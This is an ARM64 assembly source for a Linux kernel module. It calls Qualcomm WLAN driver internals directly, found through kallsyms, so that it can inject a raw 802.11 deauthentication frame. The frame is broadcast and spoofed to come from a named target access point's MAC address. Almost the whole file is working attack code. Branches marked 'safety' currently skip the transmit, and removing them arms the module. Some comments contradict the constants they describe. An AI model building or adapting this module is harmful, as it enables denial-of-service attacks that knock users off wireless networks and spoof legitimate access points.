/*
 * wma_tx.S - Direct Firmware TX via wma_tx_packet
 *
 * Strategy: call wma_tx_packet directly, bypassing all nl80211/cfg80211/HDD layers
 *
 * wma_tx_packet(wma_ctx, tx_frame, frmLen, frmType, txDir, tid,
 *               dl_comp_cb, pData, ota_comp_cb, tx_flag, vdev_id,
 *               tdlsFlag, channel_freq, rid)
 *
 * cds_packet_alloc(size, &data, &ppPacket) -> QDF_STATUS
 * cds_get_context(module_id) -> void*
 *
 * Build: as -o wma_tx.o wma_tx.S && ld -r -o wma_tx.ko wma_tx.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "wmatx"
    .fill 49, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=wmatx"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
str_cds_get_ctx:
    .asciz "cds_get_context"
str_cds_pkt_alloc:
    .asciz "cds_packet_alloc"
str_wma_tx:
    .asciz "wma_tx_packet"

fmt_init:
    .asciz "wmatx: init\n"
fmt_sym:
    .asciz "wmatx: cds_get_context=%px cds_packet_alloc=%px wma_tx_packet=%px\n"
fmt_ctx:
    .asciz "wmatx: wma_ctx(%d)=%px\n"
fmt_alloc:
    .asciz "wmatx: alloc: status=%d pkt=%px data=%px\n"
fmt_frame:
    .asciz "wmatx: sending deauth frame len=%d freq=%d vdev=%d\n"
fmt_result:
    .asciz "wmatx: wma_tx_packet returned %d\n"
fmt_err:
    .asciz "wmatx: ERROR: symbol lookup failed\n"
fmt_ctxerr:
    .asciz "wmatx: ERROR: wma context is NULL\n"
fmt_allocerr:
    .asciz "wmatx: ERROR: packet alloc failed (status=%d)\n"
fmt_done:
    .asciz "wmatx: done\n"
fmt_pre_tx:
    .asciz "wmatx: about to call wma_tx_packet...\n"
fmt_copy_done:
    .asciz "wmatx: frame copied to data buffer at %px\n"

/*
 * 802.11 Deauth frame (24 + 2 = 26 bytes):
 * FC: 0x00C0 (deauth, from DS)
 * Duration: 0x0000
 * DA: ff:ff:ff:ff:ff:ff (broadcast)
 * SA: 04:67:61:d6:dc:92 (spoofed as target AP)
 * BSSID: 04:67:61:d6:dc:92
 * SeqCtrl: 0x0000
 * Reason: 0x0007 (Class 3 frame received from non-associated STA)
 */

.section .data, "aw"
.balign 8
fn_cds_ctx:     .quad 0
fn_pkt_alloc:   .quad 0
fn_wma_tx:      .quad 0
pkt_ptr:        .quad 0
data_ptr:       .quad 0

/* Deauth frame template */
.balign 4
deauth_frame:
    .short 0x00C0      /* FC: deauth, from DS */
    .short 0x0000      /* Duration */
    /* DA: broadcast */
    .byte 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
    /* SA: spoofed as target AP */
    .byte 0x04, 0x67, 0x61, 0xd6, 0xdc, 0x92
    /* BSSID: target AP */
    .byte 0x04, 0x67, 0x61, 0xd6, 0xdc, 0x92
    .short 0x0000      /* Seq ctrl */
    .short 0x0007      /* Reason: Class 3 */
deauth_frame_end:

.equ FRAME_LEN, deauth_frame_end - deauth_frame   /* should be 26 */
.equ WMA_MODULE_ID, 54      /* QDF_MODULE_ID_WMA = 0x36 */
.equ TXRX_FRM_802_11_MGMT, 0
.equ ANI_TXDIR_TODS, 0
.equ TARGET_FREQ, 0         /* 0 = use current channel for safety */
.equ VDEV_ID, 0

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-96]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    str x27, [sp, #80]

    /* Print init */
    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* Look up symbols */
    adrp x0, str_cds_get_ctx
    add x0, x0, :lo12:str_cds_get_ctx
    bl kallsyms_lookup_name
    cbz x0, .Lsym_err
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_cds_pkt_alloc
    add x0, x0, :lo12:str_cds_pkt_alloc
    bl kallsyms_lookup_name
    cbz x0, .Lsym_err
    mov x20, x0                /* x20 = cds_packet_alloc */

    adrp x0, str_wma_tx
    add x0, x0, :lo12:str_wma_tx
    bl kallsyms_lookup_name
    cbz x0, .Lsym_err
    mov x21, x0                /* x21 = wma_tx_packet */

    /* Print symbol addresses */
    adrp x0, fmt_sym
    add x0, x0, :lo12:fmt_sym
    mov x1, x19
    mov x2, x20
    mov x3, x21
    bl printk

    /* Get WMA context: cds_get_context(WMA_MODULE_ID) */
    mov w0, #WMA_MODULE_ID
    blr x19                    /* call cds_get_context */
    mov x22, x0                /* x22 = wma_ctx */

    /* Print context */
    adrp x0, fmt_ctx
    add x0, x0, :lo12:fmt_ctx
    mov w1, #WMA_MODULE_ID
    mov x2, x22
    bl printk

    /* SAFETY: stop here for debugging */
    b .Lexit_ok

    cbz x22, .Lctx_err

    /* Allocate packet: cds_packet_alloc(frame_len, &data, &pkt)
     * Use STACK for output pointers instead of global variables */
    sub sp, sp, #16            /* allocate stack space for 2 pointers */
    mov x8, sp
    str xzr, [x8]              /* clear data ptr */
    str xzr, [x8, #8]          /* clear pkt ptr */

    mov w0, #FRAME_LEN         /* size = 26 */
    mov x1, x8                 /* &data (on stack) */
    add x2, x8, #8             /* &pkt (on stack + 8) */
    blr x20                    /* call cds_packet_alloc */
    mov w23, w0                /* w23 = status */

    /* Load pkt and data pointers from stack */
    ldr x25, [sp]              /* x25 = data pointer */
    ldr x24, [sp, #8]          /* x24 = pkt pointer */
    add sp, sp, #16            /* restore stack */

    /* Print alloc result */
    adrp x0, fmt_alloc
    add x0, x0, :lo12:fmt_alloc
    mov w1, w23
    mov x2, x24
    mov x3, x25
    bl printk

    /* Check alloc success (QDF_STATUS_SUCCESS = 0) */
    cbnz w23, .Lalloc_err

    /* Copy deauth frame to data buffer */
    adrp x8, deauth_frame
    add x8, x8, :lo12:deauth_frame
    mov x9, x25                /* data ptr */
    mov w10, #FRAME_LEN
.Lcopy:
    cbz w10, .Lcopy_done
    ldrb w11, [x8], #1
    strb w11, [x9], #1
    sub w10, w10, #1
    b .Lcopy
.Lcopy_done:

    /* Print copy done */
    adrp x0, fmt_copy_done
    add x0, x0, :lo12:fmt_copy_done
    mov x1, x25
    bl printk

    /* Print pre-TX */
    adrp x0, fmt_pre_tx
    add x0, x0, :lo12:fmt_pre_tx
    bl printk

    /* Skip wma_tx_packet for safety test */
    b .Lexit_ok

    /*
     * Call wma_tx_packet(wma_ctx, tx_frame, frmLen, frmType, txDir, tid,
     *                    dl_comp_cb, pData, ota_comp_cb, tx_flag, vdev_id,
     *                    tdlsFlag, channel_freq, rid)
     *
     * ARM64 ABI: x0-x7 = first 8 args, rest on stack
     *
     * x0 = wma_ctx       (x22)
     * x1 = tx_frame/pkt  (x24)
     * x2 = frmLen         (26)
     * x3 = frmType        (TXRX_FRM_802_11_MGMT = 0)
     * x4 = txDir          (ANI_TXDIR_TODS = 0)
     * x5 = tid            (0)
     * x6 = dl_comp_cb     (NULL)
     * x7 = pData          (NULL)
     * [sp+0]  = ota_comp_cb   (NULL)
     * [sp+8]  = tx_flag       (0)
     * [sp+16] = vdev_id       (0)
     * [sp+24] = tdlsFlag      (0, as int)
     * [sp+32] = channel_freq  (2412)
     * [sp+40] = rid           (0)
     */

    /* Set up stack args */
    sub sp, sp, #48
    stp xzr, xzr, [sp, #0]     /* ota_comp_cb=NULL, tx_flag=0 */
    stp xzr, xzr, [sp, #16]    /* vdev_id=0, tdlsFlag=0 */
    mov x8, #TARGET_FREQ
    str x8, [sp, #32]           /* channel_freq=2412 */
    str xzr, [sp, #40]          /* rid=0 */

    /* Set up register args */
    mov x0, x22                 /* wma_ctx */
    mov x1, x24                 /* tx_frame (pkt/nbuf) */
    mov w2, #FRAME_LEN          /* frmLen = 26 */
    mov w3, #TXRX_FRM_802_11_MGMT  /* frmType = 0 */
    mov w4, #ANI_TXDIR_TODS     /* txDir = 0 */
    mov w5, #0                  /* tid = 0 */
    mov x6, xzr                 /* dl_comp_cb = NULL */
    mov x7, xzr                 /* pData = NULL */

    blr x21                     /* call wma_tx_packet */
    add sp, sp, #48             /* restore stack */

    mov w26, w0                 /* save result */

    /* Print result */
    adrp x0, fmt_result
    add x0, x0, :lo12:fmt_result
    mov w1, w26
    bl printk

    b .Lexit_ok

.Lsym_err:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    bl printk
    mov w0, #-1
    b .Lexit

.Lctx_err:
    adrp x0, fmt_ctxerr
    add x0, x0, :lo12:fmt_ctxerr
    bl printk
    mov w0, #-1
    b .Lexit

.Lalloc_err:
    adrp x0, fmt_allocerr
    add x0, x0, :lo12:fmt_allocerr
    mov w1, w23
    bl printk
    mov w0, #-1
    b .Lexit

.Lexit_ok:
    adrp x0, fmt_done
    add x0, x0, :lo12:fmt_done
    bl printk
    mov w0, #0

.Lexit:
    ldr x27, [sp, #80]
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #96
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

.section .note.Linux, "a", @note
    .long 6
    .long 0
    .long 0x100
    .asciz "Linux"
    .balign 4

.section .plt, "ax"
    .balign 8
    .space 8
.section .init.plt, "ax"
    .balign 8
    .space 8
.section .text.ftrace_trampoline, "ax"
    .balign 8
